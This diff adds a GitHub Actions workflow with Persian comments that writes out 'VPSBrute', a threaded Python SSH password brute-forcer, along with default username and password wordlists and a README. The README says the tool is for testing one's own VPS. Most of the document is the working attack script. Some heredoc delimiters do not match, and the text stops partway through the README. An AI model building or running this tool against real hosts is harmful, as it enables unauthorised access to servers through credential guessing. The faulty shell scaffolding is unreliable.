@@ -1,0 +1,165 @@
+name: ساخت ابزار تست نفوذ VPS
+
+on:
+  workflow_dispatch:
+    inputs:
+      tool_name:
+        description: 'نام ابزار'
+        required: true
+        default: 'VPSBrute'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: ایجاد ساختار پروژه
+        run: |
+          mkdir ${{ github.event.inputs.tool_name }}
+          cd ${{ github.event.inputs.tool_name }}
+
+          # اسکریپت اصلی پایتون
+          cat <<'PYEOF' > vps_brute.py
+          #!/usr/bin/env python3
+          """
+          VPSBrute - ابزار تست نفوذ قانونی برای VPSهای شخصی
+          استفاده: python3 vps_brute.py --target <IP> --protocol ssh --userlist userlist.txt --passlist passlist.txt
+          """
+          import argparse
+          import concurrent.futures
+          import time
+          import sys
+          from pathlib import Path
+
+          # برای SSH
+          try:
+              import paramiko
+          except ImportError:
+              print("[!] کتابخونه paramiko نصب نیست. نصب کن: pip install paramiko")
+              sys.exit(1)
+
+          # برای FTP (در آینده می‌تونی اضافه کنی)
+          # from ftplib import FTP
+
+          def try_ssh(host, port, username, password, timeout=5):
+              client = paramiko.SSHClient()
+              client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+              try:
+                  client.connect(host, port=port, username=username, password=password, timeout=timeout)
+                  client.close()
+                  return True
+              except:
+                  return False
+
+          def load_list(filepath):
+              p = Path(filepath)
+              if not p.exists():
+                  print(f"[!] فایل {filepath} پیدا نشد.")
+                  sys.exit(1)
+              with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                  return [line.strip() for line in f if line.strip()]
+
+          def brute_worker(host, port, username, password, delay, results_list, quiet):
+              time.sleep(delay)
+              success = False
+              # این بخش با توجه به protocol انتخاب می‌کنیم (الان فقط SSH ساپورت می‌کنیم)
+              success = try_ssh(host, port, username, password)
+              if success:
+                  result_str = f"[+] موفق: {username}:{password}@{host}:{port}"
+                  print(result_str)
+                  results_list.append(result_str)
+              else:
+                  if not quiet:
+                      print(f"[-] شکست: {username}:{password}")
+
+          def main():
+              parser = argparse.ArgumentParser(description="VPSBrute - تست نفوذ VPS شخصی")
+              parser.add_argument("--target", required=True, help="آدرس IP یا دامنه VPS")
+              parser.add_argument("--port", type=int, default=22, help="پورت سرویس (پیش‌فرض: 22)")
+              parser.add_argument("--protocol", choices=["ssh"], default="ssh", help="پروتکل (فعلا فقط ssh)")
+              parser.add_argument("--userlist", required=True, help="مسیر فایل userlist.txt")
+              parser.add_argument("--passlist", required=True, help="مسیر فایل passlist.txt")
+              parser.add_argument("--threads", type=int, default=4, help="تعداد نخ (پیش‌فرض: 4)")
+              parser.add_argument("--delay", type=float, default=0.5, help="تاخیر بین تلاش‌ها (ثانیه)")
+              parser.add_argument("--output", default="found.txt", help="فایل خروجی برای پسوردهای پیدا شده")
+              parser.add_argument("--quiet", action="store_true", help="فقط موفقیت‌ها را نشان بده")
+
+              args = parser.parse_args()
+
+              users = load_list(args.userlist)
+              passwords = load_list(args.passlist)
+              print(f"[*] بارگذاری {len(users)} کاربر و {len(passwords)} پسورد.")
+              print(f"[*] شروع تست روی {args.target}:{args.port} با پروتکل {args.protocol}...")
+
+              found = []
+              with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
+                  futures = []
+                  idx = 0
+                  for user in users:
+                      for pwd in passwords:
+                          futures.append(
+                              executor.submit(
+                                  brute_worker,
+                                  args.target,
+                                  args.port,
+                                  user,
+                                  pwd,
+                                  idx * args.delay,
+                                  found,
+                                  args.quiet
+                              )
+                          )
+                          idx += 1
+
+                  concurrent.futures.wait(futures)
+
+              if found:
+                  with open(args.output, 'w') as f_out:
+                      for entry in found:
+                          f_out.write(entry + '\n')
+                  print(f"\n[+] تست تمام شد. {len(found)} حساب پیدا شد. ذخیره در {args.output}")
+              else:
+                  print("\n[-] هیچ ترکیب موفقی پیدا نشد.")
+
+          if __name__ == "__main__":
+              main()
+          PYEOF
+
+          chmod +x vps_brute.py
+
+          # فایل نمونه userlist.txt
+          cat <<'USERS' > userlist.txt
+          root
+          admin
+          ubuntu
+          test
+          USER
+          admin
+          administrator
+          USERS
+
+          # فایل نمونه passlist.txt
+          cat <<'PWDS' > passlist.txt
+          password
+          123456
+          12345678
+          admin
+          root
+          toor
+          qwerty
+          letmein
+          PWD
+
+          # README فارسی
+          cat <<'MDEOF' > README.md
+          # VPSBrute - ابزار تست نفوذ VPS شخصی
+
+          این ابزار برای بررسی امنیت سرورهای شخصی شما طراحی شده. **فقط روی سیستم‌هایی که مالک آن هستید استفاده کنید.**
+
+          ## نیازمندی‌ها
+          - پایتون 3.6+
+          - کتابخونه paramiko (`pip install paramiko`)
+
+          ## استفاده
+
+          ```bash
+          python3 vps_brute.py --target 192.168.1.100 --userlist userlist.txt --passlist passlist.txt
